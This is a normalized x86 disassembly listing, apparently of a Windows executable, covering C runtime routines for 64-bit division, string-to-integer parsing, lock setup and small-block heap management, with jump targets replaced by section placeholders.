mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4480c2
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
xor eax eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] al
mov [ ebp - 0x6 ] al
mov [ ebp - 0x5 ] al
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] al
mov [ ebp - 0x2 ] al
mov [ ebp - 0x1 ] al
cmp [ rw-data ] eax
je r-xdata
mov eax sub_451f05
push [ rw-data ]
call sub_445378
pop ecx
jmp r-xdata
add ecx 0xfffffc18
cmp ecx 0xc
ja r-xdata
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx 0xa6
cmp ecx edx
jg r-xdata
pop edi
pop esi
pop ebx
leave
retn
jmp [ ecx * 4 + jump_table_44833e ]
mov [ ebp - 0x28 ] 0x3
mov [ ebp - 0x24 ] r--data
jmp r-xdata
cmp ecx 0x19
jg r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov [ ebp - 0x24 ] r--data
fld [ edi ]
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x20 ]
push ecx
fld [ ebx ]
fstp [ ebp - 0x18 ]
fld [ esi ]
fstp [ ebp - 0x10 ]
call eax
pop ecx
test eax eax
jne r-xdata
sub ecx 0x1a
je r-xdata
je r-xdata
fld [ edi ]
fstp [ ebp - 0x20 ]
fld [ ebx ]
fstp [ ebp - 0x18 ]
fld [ esi ]
jmp r-xdata
fld [ edi ]
fstp [ esi ]
jmp r-xdata
fld [ edi ]
fmul [ ebp - 0x8 ]
fst [ esi ]
fld [ edi ]
fstp [ ebp - 0x20 ]
fld [ ebx ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x10 ]
call sub_443b37
mov [ eax ] 0x21
call sub_443b37
mov [ eax ] 0x22
jmp r-xdata
fld1
jmp r-xdata
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
mov edx ecx
push 0x2
pop ecx
sub edx ecx
je r-xdata
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x28 ] 0x1
call eax
pop ecx
test eax eax
jne r-xdata
fstp [ esi ]
mov [ ebp - 0x28 ] 0x2
jmp r-xdata
dec ecx
je r-xdata
fld [ edi ]
lea ecx [ ebp - 0x28 ]
fstp [ ebp - 0x20 ]
push ecx
fld [ ebx ]
mov [ ebp - 0x28 ] 0x4
fstp [ ebp - 0x18 ]
fld [ esi ]
fstp [ ebp - 0x10 ]
call eax
pop ecx
jmp r-xdata
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec edx
je r-xdata
mov [ ebp - 0x24 ] r--data
dec ecx
je r-xdata
mov [ ebp - 0x24 ] r--data
jmp r-xdata
sub edx 0x5
je r-xdata
mov [ ebp - 0x24 ] r--data
sub ecx 0x1d
je r-xdata
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec edx
je r-xdata
sub ecx 0x3
jne r-xdata
mov [ ebp - 0x24 ] r--data
sub edx 0x5
je r-xdata
mov [ ebp - 0x28 ] 0x3
mov [ ebp - 0x24 ] r--data
jmp r-xdata
dec edx
je r-xdata
mov [ ebp - 0x24 ] r--data
sub edx 0x9
jne r-xdata
mov [ ebp - 0x28 ] 0x3
sub_44845b
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x30 ]
call sub_441455
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
xor esi esi
cmp eax esi
je r-xdata
cmp ebx esi
jne r-xdata
mov [ eax ] ebx
cmp [ ebp + 0x14 ] esi
je r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
movzx esi [ ebx ]
lea edi [ ebx + 0x2 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x30 ]
push eax
push 0x8
push esi
call sub_44a27e
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
pop ebx
leave
retn
movzx esi [ edi ]
inc edi
inc edi
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
movzx esi [ edi ]
inc edi
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
xor eax eax
xor edx edx
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x10
pop ebx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
call sub_44a0a3
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
push eax
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
call sub_4517d0
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
push esi
call sub_44a0a3
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] ebx
cmp ax 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
dec edi
test al 0x8
jne r-xdata
mov ecx [ ebp - 0x4 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0xc ]
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
inc edi
inc edi
movzx esi [ edi ]
inc edi
inc edi
cmp ax 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_44de40
xor ecx ecx
add eax ebx
adc edx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
ja r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_443b37
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_44a0a3
mov ebx eax
pop ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
lea ebx [ eax - 0x37 ]
sub eax 0x20
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0xc ]
jne r-xdata
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
movzx esi [ edi ]
inc edi
inc edi
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x14 ]
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] esi
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
cmp ebx [ ebp - 0x18 ]
jbe r-xdata
pop edi
cmp [ ebp - 0x8 ] 0xffffffff
jbe r-xdata
sub_44870f
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_44845b
add esp 0x14
pop ebp
retn
sub_44873a
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_44876a
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_45010c
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_4487b5
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_44120e
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_448823
push 0xc
push r--data
call sub_4433dc
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_44b0a5
push 0x1e
call sub_44aefa
push 0xff
call sub_445b21
push 0x18
call sub_445f36
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_4488e6
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_443b37
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_443421
retn
push edi
call sub_44120e
pop ecx
push 0xfa0
push edi
call sub_45010c
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_44120e
pop ecx
call sub_443b37
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4488dd
mov eax [ ebp - 0x1c ]
sub_4488e6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_448823
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_445acd
pop ecx
sub_448919
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_448949
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_441f70
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_448c5f
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_448d0f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_448e17
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
